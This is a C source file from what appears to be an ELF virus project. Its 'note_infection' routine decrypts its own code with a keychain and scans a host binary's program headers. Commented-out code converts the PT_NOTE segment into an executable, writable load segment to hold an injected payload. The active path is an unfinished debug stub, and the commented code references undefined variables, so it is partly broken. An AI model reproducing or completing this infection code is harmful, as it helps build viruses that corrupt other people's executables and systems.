#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline Elf64_Phdr *get_segment(const struct s_host *host, const size_t index)
{
	Elf64_Phdr *segment;

	segment = (Elf64_Phdr *)((void *)host->header + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));

	if ((void *)segment >= (void *)host->header + host->filesize)
		segment = NULL;

	return segment;
}

//__attribute__((always_inline)) static inline bool is_data_segment(const Elf64_Phdr *segment)
//{
//	if (segment->p_type != PT_LOAD)
//		return false;
//
//	return segment->p_flags == (PF_W | PF_R);
//}
//
//__attribute__((always_inline)) static inline bool is_note_segment(const Elf64_Phdr *segment)
//{
//	return segment->p_type == PT_NOTE;
//}
//
//__attribute__((always_inline)) static inline void update_note_segment(struct s_note *note)
//{
//	const size_t base = note->data->p_vaddr + note->data->p_memsz;
//	const size_t add_padding = base % note->data->p_align;
//
//	info->note->p_vaddr = base + (info->data->p_align - add_padding);
//	info->note->p_paddr = info->note->p_vaddr;
//	info->note->p_offset = base - add_padding;
//
//	info->note->p_filesz = PAYLOAD_SIZE;
//	info->note->p_memsz = PAYLOAD_SIZE;
//
//	info->note->p_type = PT_LOAD;
//	info->note->p_flags = (PF_X | PF_W | PF_R);
//	info->note->p_align = info->data->p_align;
//}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void note_infection(struct s_host *host, struct s_keychain *keychain)
{
	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
	
//	struct s_note note = {0};
	Elf64_Phdr *segment = NULL;

	for (Elf64_Half index = 0; index < host->header->e_phnum; index++)
	{
		if ((segment = get_segment(host, index)) == NULL)
			goto label_error;

		printf("%lx\n", segment->p_offset);

//		if (is_data_segment(segment) == true)
//			note.data = segment;
//		if (is_note_segment(segment) == true)
//			self.note = segment;
	}
	
	if (segment == NULL)
		goto label_error;

//	if (note.self)
//	{
//		update_note_segment(&note);
//		host->note = &note;
//	}

	printf("note\n");
	exit(0);

label_error:
	printf("error\n");
	exit(1);
}
